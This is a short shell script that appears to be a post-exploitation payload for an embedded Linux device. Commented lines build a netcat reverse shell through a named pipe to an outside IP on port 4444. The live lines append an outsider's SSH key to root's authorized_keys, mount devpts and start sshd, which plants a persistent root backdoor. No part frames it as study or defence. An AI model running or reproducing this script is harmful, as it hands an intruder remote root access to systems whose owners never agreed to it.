#!/bin/sh
# mknod /tmp/backpipe p
# /bin/sh 0</tmp/backpipe | nc 172.16.0.141 4444 1>/tmp/backpipe &

echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCZCUENmyvR36DDmrNBfm3akmWvBI6CU9sDIu191ZuZKW/pTg/PKQlFXgo1Gs++NCtWF+VtFrbse5DX8KsCv0NE64JknftazKv9I3embZnBQhUledG5s8zreuLZtAOnkMS50g20tQFmAMa3t4biuF/h7EHOzyBJYLKvBdCnTWUSgjoviUWtuwcA3cLLERIHh7W02dF4ClrmZ84K8TT6wWc45XJz/ZlHwpK55DM8MDzmLKDaSG0g17JBS91kQzExd50n7Ip1pzyiXm8V0GjJYMKw2r2891Ol53ZY0DosJprluV33IFo3M52uZiM2Z51yfy97FB25Y/GyEICT41oWhB+0LLlNNS8tYYiRTpFJXZl6cAQJKxuWphf+DRICW6IK3k4VNqadQtWC4IJmHqNFM47gnhtGEN+NNLT9DPoQu4kENYgu8RhgiqJFg8P8KClXgmbuzYNdFVl3NOp5X4IaK0GAtVibbXJGVJF+P3MMwQ4NsLTLercuII60r2IswCi5pKM= xss@foxbook.local" >> /root/.ssh/authorized_keys
export LD_LIBRARY_PATH=${LD_LIBRARY_PATH}:/aip_dir/middle/openssl/lib
mount -t devpts devpts /dev/pts
/usr/local/sbin/sshd